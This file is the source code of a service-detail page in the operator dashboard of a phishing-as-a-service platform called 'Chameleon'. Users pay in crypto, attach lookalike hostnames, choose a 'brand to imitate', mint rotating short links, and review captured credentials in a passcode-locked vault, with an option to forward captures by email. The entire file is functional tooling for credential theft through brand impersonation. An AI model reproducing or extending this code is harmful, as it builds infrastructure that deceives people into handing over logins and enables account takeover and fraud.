import { notFound, redirect } from "next/navigation";
import { NotFoundError } from "@chameleon/db";
import { ActivateSchema } from "@chameleon/contracts";
import { ZodError } from "zod";
import { requirePageSession } from "../../../server/session";
import { latestPayment } from "../../../server/billing";
import { addAddress, listAddresses } from "../../../server/forwards";
import { activateIn, getService } from "../../../server/services";
import {
  checkDomain,
  listDomains,
  removeDomain,
  requestDomain,
  routingTarget,
} from "../../../server/domains";
import { mintLink, listBrands, listLinks, revokeLink } from "../../../server/links";
import { countCaptures, listCaptures } from "../../../server/vault";
import { DnsRecords } from "../../../components/dns-record";
import { CopyButton } from "../../../components/copy";
import { ConfirmSubmit } from "../../../components/shell";
import {
  Empty,
  PageHeader,
  StatusPill,
  money,
  shortDate,
  shortTime,
} from "../../../components/ui";

const errors: Record<string, string> = {
  email_unverified: "Verify your email before activating this service.",
  passcode_mismatch: "A passcode is already set with a different value.",
  invalid_input: "Check the highlighted value.",
  bad_passcode: "The passcode must be exactly 4 digits.",
  owner_only: "Only the org owner can do that.",
  bad_hostname: "That is not a hostname (no scheme, no path).",
  bad_brand: "Pick a brand for the link.",
  domain_and_brand_required: "A link needs a hostname and a brand.",
  domain_exists: "That hostname is already attached here.",
  domain_tombstoned: "Another org used that hostname in the last 30 days.",
  domain_not_active: "Wait until the hostname is active before creating links.",
  cap: "No slots left on this tier for that.",
  zone_full: "The platform is at its live-domain ceiling.",
  not_found: "That row is gone.",
  payment_required: "Pay for this service before activating it.",
  billing_off: "Payments are not configured on this host yet.",
  service_archived: "This service is archived.",
  service_not_active: "Activate the service first.",
  address_cap: "Five forwarding addresses is the ceiling.",
  address_unverified: "Confirm that address before forwarding to it.",
  capture_malformed: "That capture has nothing to send.",
  no_address: "Add a forwarding address first.",
};

const okay: Record<string, string> = {
  activated: "Activated. The 30-day clock is running.",
  domain_added: "Hostname added. Publish the records below, then check.",
  domain_checked: "Check finished. The state below is the probe result.",
  domain_active: "Verified and live. TLS is issued and the host routes.",
  link_minted: "Link created. It is live as soon as the hostname is.",
  link_revoked: "Link revoked. Nothing new resolves on it.",
  forward_added: "Address saved. Confirm it if it is not your signup address.",
  forwarded: "Capture queued for mail.",
  renewed: "Payment confirmed. The period is extended.",
};

function codeOf(error: unknown): string {
  return (error as { code?: string }).code ?? "not_found";
}

export default async function ServiceDetail({
  params,
  searchParams,
}: {
  params: Promise<{ id: string }>;
  searchParams: Promise<Record<string, string | undefined>>;
}) {
  const { id } = await params;
  const session = await requirePageSession();
  let service;
  try {
    service = await getService(session, id);
  } catch (error) {
    if (error instanceof NotFoundError) notFound();
    throw error;
  }
  const paramsOut = await searchParams;
  const error = paramsOut.error;
  const flash = Object.keys(okay).find((key) => paramsOut[key]);

  const paid = service.paidUntil !== null && new Date(service.paidUntil) > new Date();
  const payment = paid ? null : await latestPayment(session, service.id);
  const activated = Boolean(service.activatedAt);
  const price = money(service.priceCents);

  const [domains, links, brands, captures, totalCaptures, addresses] = activated
    ? await Promise.all([
        listDomains(session, id),
        listLinks(session, id),
        listBrands(),
        listCaptures(session, { serviceId: id, limit: 5 }),
        countCaptures(session, { serviceId: id }),
        listAddresses(session),
      ])
    : [[], [], [], [], { total: 0, new: 0, valid: 0, invalid: 0 }, []];
  const activeDomains = domains.filter((domain) => domain.status === "active");

  async function activate(formData: FormData) {
    "use server";
    const ctx = await requirePageSession();
    try {
      const input = ActivateSchema.parse({
        passcode: String(formData.get("passcode") ?? "").trim(),
        gateMode: String(formData.get("gateMode") ?? "always"),
      });
      await activateIn(ctx, id, input);
    } catch (reason) {
      const code = reason instanceof ZodError ? "bad_passcode" : codeOf(reason);
      redirect(`/services/${id}?error=${code}#activation`);
    }
    redirect(`/services/${id}?activated=1`);
  }

  async function addDomain(formData: FormData) {
    "use server";
    const ctx = await requirePageSession();
    try {
      await requestDomain(ctx, id, String(formData.get("hostname") ?? ""));
    } catch (reason) {
      redirect(`/services/${id}?error=${codeOf(reason)}#domains`);
    }
    redirect(`/services/${id}?domain_added=1#domains`);
  }

  async function verifyDomain(formData: FormData) {
    "use server";
    const ctx = await requirePageSession();
    try {
      const result = await checkDomain(ctx, String(formData.get("domainId") ?? ""));
      redirect(
        `/services/${id}?${result.status === "active" ? "domain_active" : "domain_checked"}=1#domains`,
      );
    } catch (reason) {
      redirect(`/services/${id}?error=${codeOf(reason)}#domains`);
    }
  }

  async function deleteDomain(formData: FormData) {
    "use server";
    const ctx = await requirePageSession();
    try {
      await removeDomain(ctx, String(formData.get("domainId") ?? ""));
    } catch (reason) {
      redirect(`/services/${id}?error=${codeOf(reason)}#domains`);
    }
    redirect(`/services/${id}#domains`);
  }

  async function createLink(formData: FormData) {
    "use server";
    const ctx = await requirePageSession();
    try {
      await mintLink(ctx, id, {
        domainId: String(formData.get("domainId") ?? ""),
        brandId: String(formData.get("brandId") ?? ""),
      });
    } catch (reason) {
      redirect(`/services/${id}?error=${codeOf(reason)}#links`);
    }
    redirect(`/services/${id}?link_minted=1#links`);
  }

  async function killLink(formData: FormData) {
    "use server";
    const ctx = await requirePageSession();
    try {
      await revokeLink(ctx, String(formData.get("linkId") ?? ""));
    } catch (reason) {
      redirect(`/services/${id}?error=${codeOf(reason)}#links`);
    }
    redirect(`/services/${id}?link_revoked=1#links`);
  }

  async function addForward(formData: FormData) {
    "use server";
    const ctx = await requirePageSession();
    try {
      await addAddress(ctx, String(formData.get("email") ?? ""));
    } catch (reason) {
      redirect(`/services/${id}?error=${codeOf(reason)}#forwarding`);
    }
    redirect(`/services/${id}?forward_added=1#forwarding`);
  }

  return (
    <main className="app" id="content">
      <PageHeader
        eyebrow="Service"
        crumbs={[
          { href: "/services", label: "Products & services" },
          { label: service.serviceType },
        ]}
        title={service.serviceType === "chameleon" ? "Chameleon" : service.serviceType}
        lede="A rotating capture surface. Visitors get a hostname and slug that render the pinned brand, and every submit lands in your vault."
        actions={
          <>
            <StatusPill status={service.status} />
            {activeDomains.length > 0 ? (
              <a className="btn sm" href="#links">
                Create link
              </a>
            ) : (
              <a className="btn sm" href="#domains">
                Add a domain
              </a>
            )}
          </>
        }
      />

      {error ? (
        <p className="error" role="alert">
          {errors[error] ?? "That did not work."}
        </p>
      ) : null}
      {flash ? (
        <p className="ok" role="status">
          {okay[flash]}
        </p>
      ) : null}

      {!paid ? (
        <div className="card">
          <div className="row">
            <div>
              <h2>Payment required</h2>
              <p className="muted">
                {price} buys 30 days on this service. Nothing activates, and nothing
                renders, without a paid period.
              </p>
            </div>
            {payment?.status === "pending" && payment.checkoutUrl ? (
              <a className="btn" href={payment.checkoutUrl}>
                Resume payment
              </a>
            ) : (
              <form action={`/api/services/${service.id}/checkout`} method="post">
                <button type="submit" className="btn">
                  Subscribe — {price} / 30 days
                </button>
              </form>
            )}
          </div>
          <p className="fine" style={{ marginTop: "0.7rem" }}>
            Crypto through NowPayments. The period is fixed at checkout; a confirmed
            payment is what unlocks activation. Last payment: {payment?.status ?? "none"}.
          </p>
        </div>
      ) : null}

      {paid && !activated ? (
        <section className="card" id="activation">
          <h2>Activate</h2>
          <p className="muted">
            Four digits wrap this service&apos;s vault key. Lose the passcode and the
            wrapped key cannot be opened — keep it somewhere real.
          </p>
          <form action={activate} className="stack">
            <div className="field-row">
              <div className="field">
                <label htmlFor="passcode">Vault passcode</label>
                <input
                  id="passcode"
                  name="passcode"
                  type="password"
                  autoComplete="new-password"
                  required
                  inputMode="numeric"
                  pattern="\d{4}"
                  minLength={4}
                  maxLength={4}
                  placeholder="••••"
                  style={{ letterSpacing: "0.4em", fontFamily: "ui-monospace" }}
                />
                <p className="fine">Exactly four digits, numeric keypad on mobile.</p>
              </div>
              <div className="field">
                <label htmlFor="gateMode">Vault gate</label>
                <select id="gateMode" name="gateMode" defaultValue="always">
                  <option value="always">Ask every unlock</option>
                  <option value="remember_30d">Remember 30 days on this device</option>
                  <option value="off">Off — platform can open it</option>
                </select>
              </div>
            </div>
            <div>
              <button type="submit" className="btn">
                Activate service
              </button>
            </div>
          </form>
        </section>
      ) : null}

      {activated ? (
        <div className="split">
          <div>
            {!paid ? (
              <p className="note warn">
                The paid period ended on {shortDate(service.paidUntil)}. Renew above —
                links stop resolving once it lapses.
              </p>
            ) : null}

            {activeDomains.length === 0 ? (
              <div className="card">
                <h2>Get to the first link</h2>
                <ol className="steps" style={{ marginTop: "0.9rem" }}>
                  <li>
                    <strong>Attach a hostname</strong>
                    <p className="fine">
                      Use a subdomain you control, like login.acme.com.
                    </p>
                  </li>
                  <li>
                    <strong>Publish the records</strong>
                    <p className="fine">
                      One TXT proof and one CNAME, with a copy button per value.
                    </p>
                  </li>
                  <li>
                    <strong>Create the link</strong>
                    <p className="fine">
                      Pick the brand the page should imitate. A five-character slug is
                      minted for you.
                    </p>
                  </li>
                </ol>
              </div>
            ) : null}

            <section className="card" id="links">
              <div className="row">
                <div>
                  <h2>Links</h2>
                  <p className="muted">
                    Each link is one rotating address. Pause it without losing the slug,
                    or revoke it permanently.
                  </p>
                </div>
                <span className="pill idle">
                  {links.length} / {service.linkCap}
                </span>
              </div>

              {links.length === 0 ? (
                <Empty title="No links yet">
                  Pick an active hostname and a brand. The page a visitor sees follows the
                  brand, not a generic template.
                </Empty>
              ) : (
                <div className="table">
                  {links.map((link) => (
                    <div className="tr" key={link.id}>
                      <a
                        href={link.url}
                        className="mono"
                        target="_blank"
                        rel="noreferrer"
                      >
                        {link.hostname}/{link.slug}
                      </a>
                      <StatusPill status={link.status} />
                      <span className="muted">{link.brandName ?? "no brand"}</span>
                      <span className="muted">{shortDate(link.createdAt)}</span>
                      <span className="muted">
                        {link.domainStatus === "active" ? "routing" : "host not live"}
                      </span>
                      <div className="actions">
                        <CopyButton
                          value={link.url}
                          label="Copy URL"
                          className="btn ghost sm"
                        />
                        <form action={killLink}>
                          <input type="hidden" name="linkId" value={link.id} />
                          <ConfirmSubmit
                            message={`Revoke ${link.slug}? Links already out there will stop working.`}
                          >
                            Revoke
                          </ConfirmSubmit>
                        </form>
                      </div>
                    </div>
                  ))}
                </div>
              )}

              {activeDomains.length > 0 &&
              brands.length > 0 &&
              links.length < service.linkCap ? (
                <form
                  action={createLink}
                  className="inline-form"
                  style={{ marginTop: "0.9rem" }}
                >
                  <div className="field">
                    <label htmlFor="domainId">Hostname</label>
                    <select id="domainId" name="domainId" required>
                      {activeDomains.map((domain) => (
                        <option key={domain.id} value={domain.id}>
                          {domain.hostname}
                        </option>
                      ))}
                    </select>
                  </div>
                  <div className="field">
                    <label htmlFor="brandId">Brand to imitate</label>
                    <select id="brandId" name="brandId" required>
                      {brands.map((brand) => (
                        <option key={brand.id} value={brand.id}>
                          {brand.name}
                        </option>
                      ))}
                    </select>
                  </div>
                  <button type="submit" className="btn">
                    Create link
                  </button>
                </form>
              ) : null}

              {links.length >= service.linkCap ? (
                <p className="fine">
                  Link cap reached. Revoke one, or upgrade the tier on a new service.
                </p>
              ) : null}
            </section>

            <section className="card" id="domains">
              <div className="row">
                <div>
                  <h2>Domains</h2>
                  <p className="muted">
                    Each hostname needs an ownership TXT record and a routing record.
                    Checks retry for 72 hours; the platform never guesses ownership.
                  </p>
                </div>
                <span className="pill idle">
                  {domains.length} / {service.domainCap}
                </span>
              </div>

              {domains.length === 0 ? (
                <Empty title="No hostname attached">
                  A service with no hostname has nowhere to resolve. Add one below to see
                  the exact records.
                </Empty>
              ) : (
                <div className="stack">
                  {domains.map((domain) => (
                    <div className="card flat" key={domain.id}>
                      <div className="row" style={{ marginBottom: "0.8rem" }}>
                        <strong className="mono">{domain.hostname}</strong>
                        <form action={deleteDomain}>
                          <input type="hidden" name="domainId" value={domain.id} />
                          <ConfirmSubmit
                            message={`Delete ${domain.hostname}? Its links stop resolving and the name is tombstoned for 30 days.`}
                          >
                            Delete
                          </ConfirmSubmit>
                        </form>
                      </div>
                      {domain.status === "active" ? (
                        <details>
                          <summary className="hint">
                            Live — show the records and verification state
                          </summary>
                          <div style={{ marginTop: "0.8rem" }}>
                            <DnsRecords domain={domain} serviceId={id} />
                          </div>
                        </details>
                      ) : (
                        <DnsRecords domain={domain} serviceId={id} />
                      )}
                      <div className="actions" style={{ marginTop: "0.8rem" }}>
                        <form action={verifyDomain}>
                          <input type="hidden" name="domainId" value={domain.id} />
                          <button type="submit" className="btn sm">
                            Check now
                          </button>
                        </form>
                      </div>
                    </div>
                  ))}
                </div>
              )}

              {domains.length < service.domainCap ? (
                <form
                  action={addDomain}
                  className="inline-form"
                  style={{ marginTop: "0.9rem" }}
                >
                  <div className="field">
                    <label htmlFor="hostname">Add a hostname</label>
                    <input
                      id="hostname"
                      name="hostname"
                      placeholder="login.acme.com"
                      required
                    />
                    <p className="fine">No scheme, no path. Subdomains are simplest.</p>
                  </div>
                  <button type="submit" className="btn">
                    Add hostname
                  </button>
                </form>
              ) : (
                <p className="fine">
                  Domain cap reached on this tier. Remove one or provision a larger
                  service.
                </p>
              )}
            </section>

            <section className="card" id="captures">
              <div className="row">
                <div>
                  <h2>Recent captures</h2>
                  <p className="muted">
                    Newest submits on this service. Passwords stay out of this summary.
                  </p>
                </div>
                <a className="btn ghost sm" href={`/vault?service=${id}`}>
                  Open vault
                </a>
              </div>
              {captures.length === 0 ? (
                <p className="muted">Nothing captured yet.</p>
              ) : (
                <div className="table">
                  {captures.map((capture) => (
                    <div className="tr" key={capture.id}>
                      <span className="mono">
                        {String(capture.fields.username ?? "unknown")}
                      </span>
                      <StatusPill status={capture.status} />
                      <span className="muted">{capture.source}</span>
                      <span className="muted">{shortTime(capture.receivedAt)}</span>
                      <span className="muted">{capture.slug ?? "—"}</span>
                      <span className="muted">{capture.kind}</span>
                    </div>
                  ))}
                </div>
              )}
              <p className="fine" style={{ marginTop: "0.7rem" }}>
                {totalCaptures.total} stored · {totalCaptures.new} new ·{" "}
                {totalCaptures.valid} valid
              </p>
            </section>

            <section className="card" id="forwarding">
              <div className="row">
                <div>
                  <h2>Forwarding</h2>
                  <p className="muted">
                    Captures can mail themselves out through the platform queue. Your
                    signup address is already trusted.
                  </p>
                </div>
                <a className="btn ghost sm" href="/settings/forwarding">
                  Manage
                </a>
              </div>
              <div className="tag-list">
                {addresses.length === 0 ? (
                  <span className="muted">No addresses yet.</span>
                ) : (
                  addresses.map((address) => (
                    <span className="pill" key={address.id}>
                      {address.email} · {address.status}
                    </span>
                  ))
                )}
              </div>
              <form
                action={addForward}
                className="inline-form"
                style={{ marginTop: "0.9rem" }}
              >
                <div className="field">
                  <label htmlFor="forward-email">Add an address</label>
                  <input
                    id="forward-email"
                    name="email"
                    type="email"
                    placeholder="you@elsewhere.com"
                    required
                  />
                </div>
                <button type="submit" className="btn ghost">
                  Add for confirmation
                </button>
              </form>
            </section>

            <details className="card" id="advanced">
              <summary>
                <strong>Advanced</strong>
                <span className="fine"> — identity, gate and routing target</span>
              </summary>
              <dl className="kv" style={{ marginTop: "0.9rem" }}>
                <dt>Service ID</dt>
                <dd className="mono">{service.id}</dd>
                <dt>Gate</dt>
                <dd>{service.gateMode.replace(/_/g, " ")}</dd>
                <dt>Tier</dt>
                <dd>
                  {service.tier} · {price} / 30 days
                </dd>
                <dt>Routing target</dt>
                <dd className="mono">{routingTarget()}</dd>
                <dt>Created</dt>
                <dd>{shortTime(service.createdAt)}</dd>
                <dt>Activation clock</dt>
                <dd>
                  {service.expiresAt ? shortTime(service.expiresAt) : "not started"}
                </dd>
              </dl>
            </details>
          </div>

          <aside>
            <div className="card">
              <h2>Summary</h2>
              <dl className="kv">
                <dt>Status</dt>
                <dd>
                  <StatusPill status={service.status} />
                </dd>
                <dt>Paid through</dt>
                <dd>{shortDate(service.paidUntil)}</dd>
                <dt>Links</dt>
                <dd>
                  {links.length} of {service.linkCap}
                </dd>
                <dt>Domains</dt>
                <dd>
                  {domains.length} of {service.domainCap}
                </dd>
                <dt>Captures</dt>
                <dd>{totalCaptures.total}</dd>
              </dl>
              <div className="actions" style={{ marginTop: "0.9rem" }}>
                <a className="btn ghost sm" href={`/vault?service=${id}`}>
                  Vault
                </a>
                <a className="btn ghost sm" href="/settings/domains">
                  All domains
                </a>
              </div>
            </div>
            <div className="card">
              <h2>How this service answers</h2>
              <p className="fine">
                A request for <code>host/slug</code> looks up the live host, then the
                slug, then the pinned brand. A missing host or a lapsed period is a
                branded 404, never a default tenant.
              </p>
            </div>
          </aside>
        </div>
      ) : null}
    </main>
  );
}
